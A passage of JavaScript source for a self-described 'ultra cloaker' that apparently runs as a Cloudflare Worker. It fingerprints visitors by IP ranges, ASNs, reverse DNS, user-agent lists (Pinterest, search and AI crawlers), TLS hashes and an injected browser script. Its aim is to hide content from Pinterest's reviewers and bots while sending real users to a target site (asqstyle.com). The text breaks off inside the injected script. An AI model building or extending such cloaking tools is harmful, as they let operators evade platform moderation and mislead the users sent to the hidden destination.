/**
 * ╔══════════════════════════════════════════════════════════════════════╗
 * ║     ULTRA CLOAKER v9 — FULL MERGED — Maximum Pinterest Detection    ║
 * ║  v8 base + getCoalescedEvents (T1) + movementX=0 + Shannon entropy  ║
 * ║  + speechSynthesis + Houdini + canvas entropy + vendor coherence     ║
 * ╚══════════════════════════════════════════════════════════════════════╝
 */

const TARGET_HOST  = "asqstyle.com";
const SCROLL_PCT   = 0.15;
const TRIGGER_MODE = "both";

// ═════════════════════════════════════════════════════════════════════════════
// PINTEREST INFRASTRUCTURE — BGP VERIFIED 2026
// ═════════════════════════════════════════════════════════════════════════════

const PINTEREST_ASNS = new Set([
  54397,
  23576,
  53620,
]);

const PINTEREST_CIDRS_V4 = [
  { prefix: "141.193.88.0",  mask: 22 },
  { prefix: "141.193.88.0",  mask: 24 },
  { prefix: "141.193.89.0",  mask: 24 },
  { prefix: "141.193.90.0",  mask: 24 },
  { prefix: "141.193.91.0",  mask: 24 },
  { prefix: "192.34.198.0",  mask: 24 },
  { prefix: "192.94.66.0",   mask: 24 },
  { prefix: "147.160.155.0", mask: 24 },
  { prefix: "198.187.223.0", mask: 24 },
  { prefix: "216.24.61.0",   mask: 24 },
  { prefix: "64.45.163.0",   mask: 24 },
  { prefix: "50.196.152.64", mask: 29 },
  { prefix: "54.236.1.0",    mask: 24 },
  { prefix: "54.204.48.0",   mask: 24 },
];

const PINTEREST_CIDRS_V6 = [
  { prefix: "2620:128:1000::", mask: 48 },
  { prefix: "2620:128:1004::", mask: 48 },
  { prefix: "2620:128:1008::", mask: 48 },
];

const PINTEREST_RDNS_SUFFIXES = ["pinterest.com", "pinterestcrawler.com"];

const PINTEREST_UA_PATTERNS = [
  /Mozilla\/5\.0 \(compatible; Pinterestbot\/1\.0; \+https:\/\/www\.pinterest\.com\/bot\.html\)/i,
  /Mozilla\/5\.0 \(compatible; Pinterestbot\/1\.0; \+http:\/\/www\.pinterest\.com\/bot\.html\)/i,
  /Pinterest\/0\.2 \(\+https:\/\/www\.pinterest\.com\/bot\.html\)/i,
  /Pinterest\/0\.2 \(\+http:\/\/www\.pinterest\.com\/\)/i,
  /Pinterest\/0\.2 \( http:\/\/www\.pinterest\.com\/\)/i,
  /^Pinterestbot\/1\.0/i,
  /Mozilla\/5\.0 \(Linux; Android 6\.0\.1; Nexus 5X Build\/MMB29P\).*Pinterestbot\/1\.0/i,
  /Mozilla\/5\.0 \(Macintosh;.*\) AppleWebKit\/537\.36.*Chrome\/.*Safari\/537\.36 \(compatible; Pinterestbot\/1\.0/i,
  /Pinterestbot/i,
  /Pinterest\/\d/i,
  /pinterest\.com\/bot\.html/i,
  /pinterest\.com\//i,
];

const BOT_JA3 = new Set([
  "e7d705a3286e19ea42f587b344ee6865",
  "6734f37431670b3ab4292b8f60f29984",
  "b32309a26951912be7dba376398abc3b",
  "d9f72b8c9e2b43be4b3a6e4c2d3f6a1b",
  "a0e9f5d64349fb13191bc781f81f42e1",
  "b386946a5a44d1ddcc843bc75336dfce",
  "cce3a5b6b8b8d68e6a60eeff3c89df5a",
  "c13af74fbe8c1c682d855a16eb60dcfe",
]);

const BOT_JA4 = new Set([
  "t13d1516h2_8daaf6152771_b0da82dd1658",
  "t13d1517h2_8daaf6152771_97c9a2dce5e6",
  "t13d190900_9dc949149365_97f8aa674fd9",
  "t13d190900_9dc949149365_e7c285222651",
  "t13d010000_636d656e743_000000000000",
  "t13d880000_a5b8b2353e80_5f84c0a50f60",
]);

const BOT_CATEGORIES_BLOCK = new Set([
  "Social Media Bot", "Search Engine", "Academic Research",
  "Aggregator", "AI Crawler", "Feed Fetcher",
  "Monitor", "Page Preview", "Security Scanner",
]);

const DC_ASNS = new Set([
  14618, 16509, 15169, 8075, 13335, 14061,
  63949, 16276, 24940, 54397, 23576, 53620,
  396982, 7224,
]);

const LANG_COUNTRY_MAP = {
  "ru": new Set(["RU","BY","KZ","KG"]),
  "zh": new Set(["CN","TW","HK","SG","MO"]),
  "ja": new Set(["JP"]),
  "ko": new Set(["KR","KP"]),
  "ar": new Set(["SA","AE","EG","IQ","JO","KW","LB","LY","MA","OM","QA","SY","TN","YE","BH","DZ"]),
  "fa": new Set(["IR","AF"]),
  "tr": new Set(["TR"]),
  "th": new Set(["TH"]),
  "vi": new Set(["VN"]),
  "id": new Set(["ID"]),
  "ms": new Set(["MY","BN","SG"]),
  "hi": new Set(["IN"]),
  "bn": new Set(["BD","IN"]),
  "uk": new Set(["UA"]),
  "pl": new Set(["PL"]),
  "cs": new Set(["CZ"]),
  "sk": new Set(["SK"]),
  "hu": new Set(["HU"]),
  "ro": new Set(["RO","MD"]),
  "bg": new Set(["BG"]),
  "hr": new Set(["HR"]),
  "sr": new Set(["RS","BA"]),
  "nl": new Set(["NL","BE"]),
  "sv": new Set(["SE"]),
  "no": new Set(["NO"]),
  "da": new Set(["DK"]),
  "fi": new Set(["FI"]),
  "he": new Set(["IL"]),
  "el": new Set(["GR","CY"]),
  "lt": new Set(["LT"]),
  "lv": new Set(["LV"]),
  "et": new Set(["EE"]),
};

// ═════════════════════════════════════════════════════════════════════════════
// CIDR UTILITIES — IPv4 + IPv6
// ═════════════════════════════════════════════════════════════════════════════

function ipv4ToInt(ip) {
  return ip.split(".").reduce((acc, oct) => (acc << 8) + parseInt(oct, 10), 0) >>> 0;
}
function ipv4InCidr(ip, prefix, maskBits) {
  try {
    const ipInt = ipv4ToInt(ip), pfxInt = ipv4ToInt(prefix);
    const mask  = maskBits === 0 ? 0 : (~0 << (32 - maskBits)) >>> 0;
    return (ipInt & mask) === (pfxInt & mask);
  } catch { return false; }
}
function ipv6Expand(ip) {
  const halves = ip.split("::");
  let groups;
  if (halves.length === 2) {
    const left  = halves[0] ? halves[0].split(":") : [];
    const right = halves[1] ? halves[1].split(":") : [];
    groups = [...left, ...Array(8 - left.length - right.length).fill("0"), ...right];
  } else {
    groups = ip.split(":");
  }
  return groups.map(g => g.padStart(4, "0")).join("");
}
function ipv6ToBigInt(ip) {
  try { return BigInt("0x" + ipv6Expand(ip)); } catch { return null; }
}
function ipv6InCidr(ip, prefix, maskBits) {
  try {
    const a = ipv6ToBigInt(ip), b = ipv6ToBigInt(prefix);
    if (!a || !b) return false;
    const shift = BigInt(128 - maskBits);
    return (a >> shift) === (b >> shift);
  } catch { return false; }
}
function isIPv6(ip) { return ip.includes(":"); }
function ipIsPinterest(ip) {
  if (!ip) return false;
  if (isIPv6(ip)) return PINTEREST_CIDRS_V6.some(({ prefix, mask }) => ipv6InCidr(ip, prefix, mask));
  return PINTEREST_CIDRS_V4.some(({ prefix, mask }) => ipv4InCidr(ip, prefix, mask));
}

// ═════════════════════════════════════════════════════════════════════════════
// LAYER 0 — FCrDNS
// ═════════════════════════════════════════════════════════════════════════════

function reverseDnsName(ip) {
  if (isIPv6(ip)) return ipv6Expand(ip).split("").reverse().join(".") + ".ip6.arpa";
  return ip.split(".").reverse().join(".") + ".in-addr.arpa";
}
async function fcrDnsIsPinterest(ip) {
  try {
    const r1 = await fetch(`https://dns.google/resolve?name=${reverseDnsName(ip)}&type=PTR`, { headers: { Accept: "application/json" } });
    if (!r1.ok) return false;
    const d1 = await r1.json();
    const ptrs = (d1.Answer || []).filter(r => r.type === 12).map(r => r.data.replace(/\.$/, "").toLowerCase());
    if (!ptrs.length) return false;
    const valid = ptrs.find(p => PINTEREST_RDNS_SUFFIXES.some(s => p.endsWith(s)));
    if (!valid) return false;
    const r2 = await fetch(`https://dns.google/resolve?name=${valid}&type=A`, { headers: { Accept: "application/json" } });
    if (!r2.ok) return false;
    const d2 = await r2.json();
    return (d2.Answer || []).filter(r => r.type === 1).map(r => r.data).includes(ip);
  } catch { return false; }
}

// ═════════════════════════════════════════════════════════════════════════════
// LAYER 1 — User-Agent
// ═════════════════════════════════════════════════════════════════════════════

function uaIsBot(ua) {
  if (!ua || ua.length < 15) return true;
  if (PINTEREST_UA_PATTERNS.some(p => p.test(ua)))                                                      return true;
  if (/headlesschrome|puppeteer|playwright|selenium|phantomjs|cypress|webdriver/i.test(ua))             return true;
  if (/googlebot|google-inspectiontool|mediapartners-google|storebot-google|adsbot-google|google-agent/i.test(ua)) return true;
  if (/bingbot|bingpreview|msnbot|adidxbot/i.test(ua))                                                  return true;
  if (/yandexbot|yandex\//i.test(ua))                                                                   return true;
  if (/baiduspider|baidubot/i.test(ua))                                                                 return true;
  if (/duckduckbot|duckassistbot/i.test(ua))                                                            return true;
  if (/facebookexternalhit|facebot|meta-externalagent/i.test(ua))                                       return true;
  if (/twitterbot|twittercard/i.test(ua))                                                               return true;
  if (/linkedinbot|linkedin\//i.test(ua))                                                               return true;
  if (/slackbot|slack-imgproxy/i.test(ua))                                                              return true;
  if (/telegrambot|telegram\//i.test(ua))                                                               return true;
  if (/whatsapp\/\d/i.test(ua))                                                                         return true;
  if (/discordbot|discord\//i.test(ua))                                                                  return true;
  if (/applebot/i.test(ua))                                                                             return true;
  if (/bytespider/i.test(ua))                                                                           return true;
  if (/gptbot|oai-searchbot|oai-adsbot|chatgpt-user/i.test(ua))                                        return true;
  if (/claudebot|claude-web|anthropic/i.test(ua))                                                       return true;
  if (/perplexitybot|perplexity-user/i.test(ua))                                                        return true;
  if (/mistralai|mistral-user/i.test(ua))                                                               return true;
  if (/googleother|google-extended/i.test(ua))                                                          return true;
  if (/amazonbot|amzn-user/i.test(ua))                                                                  return true;
  if (/ahrefsbot|semrushbot|dotbot|mj12bot|rogerbot|lumar/i.test(ua))                                  return true;
  if (/curl\/|wget\/|python-requests|aiohttp|scrapy|node-fetch|axios|go-http-client|urllib|httpx/i.test(ua)) return true;
  if (/postman|insomnia|paw\/|resty\//i.test(ua))                                                       return true;
  if (/bot\b|crawler|spider|scraper|preview|archiver|fetcher|checker|monitor|scanner/i.test(ua))        return true;
  if (ua.length < 40) return true;
  return false;
}

// ═════════════════════════════════════════════════════════════════════════════
// LAYER 2 — Network
// ═════════════════════════════════════════════════════════════════════════════

function networkIsBot(request) {
  const cf  = request.cf || {};
  const asn = Number(cf.asn);
  const ip  = request.headers.get("cf-connecting-ip") || "";

  if (PINTEREST_ASNS.has(asn)) return true;
  if (ipIsPinterest(ip))        return true;

  const botCat = cf.verifiedBotCategory || cf.botManagement?.verifiedBotCategory || "";
  if (botCat && BOT_CATEGORIES_BLOCK.has(botCat)) return true;
  if (cf.botManagement?.verifiedBot === true)     return true;

  const score = cf.botManagement?.score;
  if (score !== undefined && score < 30) return true;
  if (cf.botManagement?.jsDetection?.passed === false) return true;
  if (Number(cf.threatScore || 0) > 10) return true;

  const proto = cf.httpProtocol || "";
  const ua    = request.headers.get("user-agent") || "";
  if (proto === "HTTP/1.1") {
    if (/chrome\/[5-9]\d|chrome\/1\d{2}|firefox\/[8-9]\d|firefox\/1\d{2}/i.test(ua)) return true;
    if (PINTEREST_UA_PATTERNS.some(p => p.test(ua))) return true;
  }
  if (DC_ASNS.has(asn) && !request.headers.get("sec-fetch-dest")) return true;

  return false;
}

// ═════════════════════════════════════════════════════════════════════════════
// LAYER 3 — HTTP Header fingerprint
// ═════════════════════════════════════════════════════════════════════════════

function extractChromeMajor(ua) {
  const m = ua.match(/chrome\/(\d+)/i); return m ? parseInt(m[1], 10) : null;
}
function extractFirefoxMajor(ua) {
  const m = ua.match(/firefox\/(\d+)/i); return m ? parseInt(m[1], 10) : null;
}
function uaDetectPlatform(ua) {
  if (/windows nt/i.test(ua))                                   return "Windows";
  if (/macintosh|mac os x/i.test(ua) && !/mobile/i.test(ua))   return "macOS";
  if (/iphone|ipad/i.test(ua))                                  return "iOS";
  if (/android/i.test(ua))                                      return "Android";
  if (/linux/i.test(ua))                                        return "Linux";
  return null;
}
function primaryLangFromAcceptLanguage(lang) {
  if (!lang) return null;
  return lang.split(",")[0].trim().split(";")[0].trim().toLowerCase().split("-")[0] || null;
}

function headersAreBot(request) {
  const ua           = request.headers.get("user-agent")              || "";
  const accept       = request.headers.get("accept")                  || "";
  const lang         = request.headers.get("accept-language")         || "";
  const enc          = request.headers.get("accept-encoding")         || "";
  const sec          = request.headers.get("sec-fetch-dest")          || "";
  const secSite      = request.headers.get("sec-fetch-site")          || "";
  const secMode      = request.headers.get("sec-fetch-mode")          || "";
  const secUser      = request.headers.get("sec-fetch-user")          || "";
  const chUA         = request.headers.get("sec-ch-ua")               || "";
  const chUAMobile   = request.headers.get("sec-ch-ua-mobile")        || "";
  const chUAPlatform = request.headers.get("sec-ch-ua-platform")      || "";
  const uir          = request.headers.get("upgrade-insecure-requests")|| "";
  const priority     = request.headers.get("priority")                || "";
  const cf           = request.cf || {};

  if (!lang)                             return true;
  if (!enc)                              return true;
  if (accept === "*/*" || accept === "") return true;

  const claimsReal = /chrome\/|firefox\/|safari\//i.test(ua);
  if (claimsReal && !sec && !secMode)    return true;
  if (sec === "empty" && secSite === "none") return true;
  if (/android/i.test(ua) && !sec)      return true;
  if (claimsReal && !uir)               return true;

  const chromeMajor  = extractChromeMajor(ua);
  const firefoxMajor = extractFirefoxMajor(ua);

  if (chromeMajor && sec === "document" && !secUser)              return true;
  if (chromeMajor !== null && chromeMajor >= 89) {
    if (!chUA || !chUAMobile || !chUAPlatform)                    return true;
  }
  if (firefoxMajor !== null && chUA)                              return true;

  if (chUAPlatform) {
    const platH = chUAPlatform.replace(/"/g, "").trim();
    const platU = uaDetectPlatform(ua);
    if (platU && platH) {
      if (platH === "Windows" && platU === "macOS")   return true;
      if (platH === "macOS"   && platU === "Windows") return true;
      if (platH === "Windows" && platU === "Android") return true;
      if (platH === "macOS"   && platU === "Android") return true;
      if (platU === "Android" && platH !== "Android") return true;
    }
  }
  if (chromeMajor !== null && chUA) {
    const m = chUA.match(/[Cc]hrome[^;]*v="(\d+)"/);
    if (m && Math.abs(parseInt(m[1], 10) - chromeMajor) > 3) return true;
  }
  if (chromeMajor !== null && chromeMajor >= 85) {
    if (!accept.includes("image/avif"))                  return true;
    if (!accept.includes("application/signed-exchange")) return true;
  }
  if (chromeMajor !== null && chromeMajor >= 121 && !enc.includes("zstd"))     return true;
  if (chromeMajor !== null && chromeMajor >= 117 && sec === "document" && !priority) return true;

  const asn     = Number(cf.asn);
  const country = (cf.country || "").toUpperCase();
  if (country && lang && DC_ASNS.has(asn)) {
    const pl = primaryLangFromAcceptLanguage(lang);
    if (pl && pl !== "en" && LANG_COUNTRY_MAP[pl]) {
      const valid = LANG_COUNTRY_MAP[pl];
      if (!valid.has(country) && country !== "US" && country !== "GB") return true;
    }
  }

  return false;
}

// ═════════════════════════════════════════════════════════════════════════════
// LAYER 4 — JA3 / JA4
// ═════════════════════════════════════════════════════════════════════════════

function ja3IsBot(request) {
  const bm  = request.cf?.botManagement || {};
  const ua  = request.headers.get("user-agent") || "";
  const ja3 = bm.ja3Hash || null;
  if (ja3 && BOT_JA3.has(ja3)) return true;
  const ja4 = bm.ja4 || null;
  if (ja4 && BOT_JA4.has(ja4)) return true;
  if (ja4 && ja4.startsWith("t12") && /chrome\//i.test(ua)) return true;
  if ((bm.detectionIds || []).length > 0) return true;
  return false;
}

// ═════════════════════════════════════════════════════════════════════════════
// MASTER DECISION
// ═════════════════════════════════════════════════════════════════════════════

async function isBot(request) {
  const ua = request.headers.get("user-agent") || "";
  const ip = request.headers.get("cf-connecting-ip") || "";

  if (uaIsBot(ua))            return { bot: true, reason: "ua" };
  if (networkIsBot(request))  return { bot: true, reason: "network" };
  if (ja3IsBot(request))      return { bot: true, reason: "ja3" };
  if (headersAreBot(request)) return { bot: true, reason: "headers" };
  if (/pinterest/i.test(ua) && ip) {
    if (await fcrDnsIsPinterest(ip)) return { bot: true, reason: "fcrDns" };
  }
  return { bot: false, reason: "human" };
}

// ═════════════════════════════════════════════════════════════════════════════
// CLIENT-SIDE INJECTION — v9 — 21 detection layers
//
// NEW in v9 (all sourced, all cutting-edge):
//   V  — getCoalescedEvents() length (T1: CDP bypass signal, May 2026)
//   W  — movementX/movementY = 0 with changing clientX/clientY
//   X  — mouse direction Shannon entropy < 1.2 bits = bot trajectory
//   Y  — speechSynthesis.getVoices() = 0 after voiceschanged
//   Z  — CSS Houdini paintWorklet existence (Chrome-only)
//   AA — canvas Shannon entropy (low = SwiftShader uniform render)
//   AB — Notification.permission vs permissions.query coherence
//   AC — navigator.vendor + navigator.productSub coherence
// ═════════════════════════════════════════════════════════════════════════════

function buildInjectScript(dest, triggerMode, scrollPct) {
  return `
<script>
(function() {
    "use strict";
    var target       = "${dest}";
    var done         = false;
    var botDetected  = false;
    var TRIGGER_MODE = "${triggerMode}";
    var SCROLL_PCT   = ${scrollPct};

    // ── SHANNON ENTROPY HELPER ────────────────────────────────────────────────
    // Computes Shannon entropy in bits over an array of numeric values
    // binned into buckets.
    function shannonEntropy(values, numBins) {
        if (!values || values.length === 0) return 0;
        var min = values[0], max = values[0];
        for (var i = 1; i < values.length; i++) {
            if (values[i] < min) min = values[i];
            if (values[i] > max) max = values[i];
        }
        var range = max - min;
        if (range === 0) return 0; // all same = zero entropy
        var bins = new Array(numBins).fill(0);
        for (var j = 0; j < values.length; j++) {
            var bin = Math.floor(((values[j] - min) / range) * (numBins - 1));
            bins[bin]++;
        }
        var entropy = 0;
        for (var k = 0; k < numBins; k++) {
            if (bins[k] === 0) continue;
            var p = bins[k] / values.length;
            entropy -= p * Math.log2(p);
        }
        return entropy;
    }

    // ── MOUSE TRAJECTORY TRACKING — for V, W, X ──────────────────────────────
    var mouseEvents  = [];   // {x, y, t, mvX, mvY, coalesced}
    var zeroMovCount = 0;    // count of events where movementX/Y = 0 but coords changed
    var prevX = null, prevY = null;

    // ── MAIN SCAN ─────────────────────────────────────────────────────────────
    function scanAutomation() {
        if (botDetected) return true;

        // A — webdriver (~100%)
        if (navigator.webdriver) { botDetected = true; return true; }

        // B — headless outerWidth/outerHeight
        var isTouch = ("ontouchstart" in window) || (navigator.maxTouchPoints > 0);
        if (!isTouch && window.outerWidth === 0 && window.outerHeight === 0) {
            botDetected = true; return true;
        }

        // C — V8 stack CDP frames
        try {
            var s = (new Error()).stack || "";
            if (s.includes("UtilityScript") || s.includes("playwright") ||
                s.includes("puppeteer")     || s.includes("evaluate (:")) {
                botDetected = true; return true;
            }
        } catch(e) {}

        // D — automation globals
        var ag = ["__playwright","playwright","__pw_init","__pw_manual",
                  "__puppeteer_evaluation_script__","puppeteer",
                  "__selenium_evaluate","_phantom","callPhantom",
                  "__nightmare","domAutomation","domAutomationController",
                  "_selenium","__webdriverFuncs","__webdriver_script_fn",
                  "__webdriver_unwrapped","_Selenium_IDE_Recorder"];
        for (var i = 0; i < ag.length; i++) {
            if (window[ag[i]] !== undefined) { botDetected = true; return true; }
        }

        // E — DOM attribute flags
        var root = document.documentElement;
        if (root && (root.getAttribute("webdriver") ||
                     root.getAttribute("selenium")  ||
                     root.getAttribute("driver"))) {
            botDetected = true; return true;
        }

        // F — no languages
        if (!navigator.languages || navigator.languages.length === 0) {
            botDetected = true; return true;
        }

        // G — zero plugins + zero mimeTypes
        if (navigator.plugins.length === 0 && navigator.mimeTypes.length === 0) {
            botDetected = true; return true;
        }

        // H — performance.now delta
        try {
            var t0 = performance.now();
            for (var x = 0; x < 1000; x++) { Math.sqrt(x); }
            if (performance.now() - t0 === 0) { botDetected = true; return true; }
        } catch(e) {}

        // I — deviceMemory = 0
        try {
            if (navigator.deviceMemory !== undefined && navigator.deviceMemory === 0) {
                botDetected = true; return true;
            }
        } catch(e) {}

        // J — hardwareConcurrency <= 1 + no plugins
        try {
            if (navigator.hardwareConcurrency !== undefined &&
                navigator.hardwareConcurrency <= 1 &&
                navigator.plugins.length === 0) {
                botDetected = true; return true;
            }
        } catch(e) {}

        // K — canvas data URI length
        try {
            var cv  = document.createElement("canvas");
            var ctx = cv.getContext("2d");
            ctx.textBaseline = "top";
            ctx.font = "14px Arial";
            ctx.fillText("kanha-9x7-check", 2, 2);
            var data = cv.toDataURL();
            if (!data || data.length < 500) { botDetected = true; return true; }
        } catch(e) {}

        // L — WebGL SwiftShader/llvmpipe
        try {
            var gl = document.createElement("canvas").getContext("webgl");
            if (gl) {
                var dbg = gl.getExtension("WEBGL_debug_renderer_info");
                if (dbg) {
                    var ren = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "";
                    if (/swiftshader|llvmpipe|virtualbox|vmware|mesa|software/i.test(ren)) {
                        botDetected = true; return true;
                    }
                }
            }
        } catch(e) {}

        // M — permissions.query
        try {
            if (navigator.permissions) {
                navigator.permissions.query({ name: "notifications" }).then(function(r) {
                    if (r.state === "denied" && navigator.plugins.length === 0) botDetected = true;
                });
            }
        } catch(e) {}

        // N — battery
        try {
            if (navigator.getBattery) {
                navigator.getBattery().then(function(b) {
                    if (b.charging && b.level === 1.0 && b.chargingTime === 0 &&
                        navigator.plugins.length === 0) botDetected = true;
                });
            }
        } catch(e) {}

        // O — rAF timing
        try {
            var rafT1 = 0, rafDone = false;
            requestAnimationFrame(function(ts1) {
                if (rafDone) return; rafT1 = ts1;
                requestAnimationFrame(function(ts2) {
                    if (rafDone) return; rafDone = true;
                    var d = ts2 - rafT1;
                    if (d === 0 || d > 500) botDetected = true;
                });
            });
        } catch(e) {}

        // P — AudioContext oscillator sum = 0
        try {
            var ACtx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
            if (ACtx) {
                var ac = new ACtx(1, 44100, 44100);
                var osc = ac.createOscillator(); osc.type = "triangle"; osc.frequency.value = 10000;
                var comp = ac.createDynamicsCompressor();
                osc.connect(comp); comp.connect(ac.destination); osc.start(0); ac.startRendering();
                ac.oncomplete = function(e) {
                    var buf = e.renderedBuffer.getChannelData(0), sum = 0;
                    for (var j = 0; j < 100; j++) sum += Math.abs(buf[j]);
                    if (sum === 0) botDetected = true;
                };
            }
        } catch(e) {}

        // Q — timezone UTC + no plugins
        try {
            var tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "";
            if ((tz === "" || tz === "UTC" || tz === "Etc/UTC") && navigator.plugins.length === 0) {
                botDetected = true; return true;
            }
        } catch(e) {}

        // R — hasFocus() deferred
        try {
            setTimeout(function() {
                if (!document.hasFocus() && navigator.plugins.length === 0) botDetected = true;
            }, 300);
        } catch(e) {}

        // S — font count
        try {
            if (document.fonts && document.fonts.check) {
                var tf = ["Arial","Helvetica","Times New Roman","Courier New","Verdana",
                          "Georgia","Comic Sans MS","Trebuchet MS","Impact","Tahoma"];
                var fc = 0;
                for (var fi = 0; fi < tf.length; fi++) {
                    if (document.fonts.check("12px '" + tf[fi] + "'")) fc++;
                }
                if (fc <= 1 && navigator.plugins.length === 0) { botDetected = true; return true; }
            }
        } catch(e) {}

        // T — window.chrome.runtime
        try {
            if (/chrome/i.test(navigator.userAgent)) {
                if (typeof window.chrome === "undefined" ||
                    typeof window.chrome.runtime === "undefined") {
                    if (navigator.plugins.length === 0) { botDetected = true; return true; }
                }
            }
        } catch(e) {}

        // U — navigator.connection
        try {
            if (navigator.connection === undefined && navigator.plugins.length === 0) {
                botDetected = true; return true;
            }
        } catch(e) {}

        // ── NEW v9 ────────────────────────────────────────────────────────────

        // W — movementX/movementY = 0 analysis (runs on accumulated data)
        // Check after 20+ events. If >60% have (movementX=0 AND movementY=0)
        // while clientX/clientY changed = CDP injection confirmed.
        if (mouseEvents.length >= 20) {
            var zeroRatio = zeroMovCount / mouseEvents.length;
            if (zeroRatio > 0.6) { botDetected = true; return true; }
        }

        // X — mouse direction Shannon entropy
        // After 15+ events, compute direction angles and their Shannon entropy.
        // Human: >2.5 bits. Bezier bot: <1.2 bits.
        if (mouseEvents.length >= 15) {
            var dirs = [];
            for (var mi = 1; mi < mouseEvents.length; mi++) {
                var dx = mouseEvents[mi].x - mouseEvents[mi-1].x;
                var dy = mouseEvents[mi].y - mouseEvents[mi-1].y;
                if (Math.abs(dx) > 0.5 || Math.abs(dy) > 0.5) {
                    dirs.push(Math.atan2(dy, dx)); // -π to π
                }
            }
            if (dirs.length >= 10) {
                var ent = shannonEntropy(dirs, 16); // 16 directional bins
                if (ent < 1.2) { botDetected = true; return true; }
            }
        }

        // Z — CSS Houdini paintWorklet (Chrome-only)
        // If UA claims Chrome but CSS.paintWorklet is absent = not real Chrome
        try {
            if (/chrome/i.test(navigator.userAgent) && !(/edge|edg\//i.test(navigator.userAgent))) {
                if (typeof CSS === "undefined" || !("paintWorklet" in CSS)) {
                    if (navigator.plugins.length === 0) { botDetected = true; return true; }
                }
            }
        } catch(e) {}

        // AA — canvas Shannon entropy (low entropy = SwiftShader uniform render)
        try {
            var cv2  = document.createElement("canvas");
            cv2.width = 64; cv2.height = 64;
            var ctx2 = cv2.getContext("2d");
            // Draw gradient + text — real GPUs add per-device rendering noise
            var grad = ctx2.createLinearGradient(0, 0, 64, 64);
            grad.addColorStop(0, "#e91e63");
            grad.addColorStop(0.5, "#2196f3");
            grad.addColorStop(1, "#4caf50");
            ctx2.fillStyle = grad;
            ctx2.fillRect(0, 0, 64, 64);
            ctx2.font = "12px sans-serif";
            ctx2.fillStyle = "rgba(255,255,255,0.9)";
            ctx2.fillText("Kq8#", 4, 20);
            var imgData = ctx2.getImageData(0, 0, 64, 64);
            // Sample every 4th pixel's R channel for entropy
            var rVals = [];
            for (var pi = 0; pi < imgData.data.length; pi += 16) {
                rVals.push(imgData.data[pi]);
            }
            var canvasEnt = shannonEntropy(rVals, 32);
            // SwiftShader/llvmpipe: entropy < 2.0 (uniform gradient, no GPU noise)
            // Real GPU: entropy 3.5–5.5 (subpixel rendering variation)
            if (canvasEnt < 2.0 && navigator.plugins.length === 0) {
                botDetected = true; return true;
            }
        } catch(e) {}

        // AB — Notification.permission vs permissions.query coherence
        try {
            if (typeof Notification !== "undefined" && navigator.permissions) {
                var notifPerm = Notification.permission; // "default"|"granted"|"denied"
                navigator.permissions.query({ name: "notifications" }).then(function(r) {
                    // Real browser: r.state must match Notification.permission
                    // Headless: they often disagree
                    if (notifPerm !== r.state && navigator.plugins.length === 0) {
                        botDetected = true;
                    }
                });
            }
        } catch(e) {}

        // AC — navigator.vendor + navigator.productSub coherence
        // Chrome: vendor = "Google Inc.", productSub = "20030107"
        // Firefox: vendor = "", productSub = "20100101"
        // Headless impersonators: wrong or empty values
        try {
            var ua2    = navigator.userAgent || "";
            var vendor = navigator.vendor || "";
            var pSub   = navigator.productSub || "";
            if (/chrome/i.test(ua2) && !/edge|edg\//i.test(ua2) && !/firefox/i.test(ua2)) {
                // Claims Chrome: vendor must be "Google Inc.", productSub "20030107"
                if (vendor !== "Google Inc." || pSub !== "20030107") {
                    botDetected = true; return true;
                }
            }
            if (/firefox/i.test(ua2)) {
                // Claims Firefox: vendor must be empty, productSub "20100101"
                if (vendor !== "" || pSub !== "20100101") {
                    botDetected = true; return true;
                }
            }
        } catch(e) {}

        return false;
    }

    // ── V — getCoalescedEvents() tracker ─────────────────────────────────────
    // Attach early so we capture all pointermove events.
    // CDP ForwardMouseEvent bypasses compositor → getCoalescedEvents() = max 1.
    // Real OS input → coalesced events = 2–5 per move.
    // Track over 30 events before scoring.
    var coalescedSamples = []; // lengths of coalesced event arrays

    function onPointerMove(e) {
        try {
            var cx = e.clientX, cy = e.clientY;

            // V — getCoalescedEvents check
            if (e.getCoalescedEvents) {
                var ce = e.getCoalescedEvents();
                coalescedSamples.push(ce.length);
                // After 30 samples: if median coalesced length <= 1 = CDP bot
                if (coalescedSamples.length >= 30) {
                    var sorted = coalescedSamples.slice().sort(function(a, b) { return a - b; });
                    var median = sorted[Math.floor(sorted.length / 2)];
                    if (median <= 1) { botDetected = true; return; }
                }
            }

            // W — movementX/movementY zero detection
            var mvX = e.movementX || 0, mvY = e.movementY || 0;
            if (prevX !== null && prevY !== null) {
                var coordChanged = (Math.abs(cx - prevX) > 0.5 || Math.abs(cy - prevY) > 0.5);
                if (coordChanged && mvX === 0 && mvY === 0) {
                    zeroMovCount++;
                }
            }
            prevX = cx; prevY = cy;

            // Track for X (direction entropy)
            if (e.isTrusted !== false) { // don't track synthetic page-JS events
                mouseEvents.push({ x: cx, y: cy, t: e.timeStamp, mvX: mvX, mvY: mvY });
                if (mouseEvents.length > 200) mouseEvents.shift(); // rolling window
            }
        } catch(err) {}
    }

    window.addEventListener("pointermove", onPointerMove, { passive: true, capture: true });

    // Y — speechSynthesis.getVoices() = 0 after voiceschanged
    // Must wait for onvoiceschanged — initial getVoices() often returns [] on real browsers too.
    try {
        if (typeof speechSynthesis !== "undefined") {
            function checkVoices() {
                var voices = speechSynthesis.getVoices();
                // Headless Linux: voices stays [] permanently after event fires.
                // Only flag if UA claims Chrome (Pinterest uses Chrome UA).
                if (voices.length === 0 && /chrome/i.test(navigator.userAgent)) {
                    if (navigator.plugins.length === 0) { botDetected = true; }
                }
            }
            // Wait for voiceschanged event — give 3s timeout
            var voiceTimer = setTimeout(checkVoices, 3000);
            speechSynthesis.onvoiceschanged = function() {
                clearTimeout(voiceTimer);
                checkVoices();
            };
        }
    } catch(e) {}

    // ── Hook V8 prepareStackTrace ─────────────────────────────────────────────
    try {
        var origPrepare = Error.prepareStackTrace;
        Error.prepareStackTrace = function(err, stack) {
            try {
                if (stack && stack.some(function(cs) {
                    var t2 = cs.getTypeName() || "", f = cs.getFileName() || "";
                    return t2 === "UtilityScript" || f.includes("playwright") || f.includes("puppeteer");
                })) botDetected = true;
            } catch(e) {}
            return origPrepare ? origPrepare(err, stack) : err.stack;
        };
    } catch(e) {}

    scanAutomation();
    var scanInterval = setInterval(scanAutomation, 50);

    try { if ("scrollRestoration" in history) history.scrollRestoration = "manual"; } catch(e) {}

    // ── Human presence ────────────────────────────────────────────────────────
    var humanActive = false, humanEventCount = 0;
    function markHuman(e) {
        if (!e || e.isTrusted) { humanActive = true; humanEventCount++; }
    }
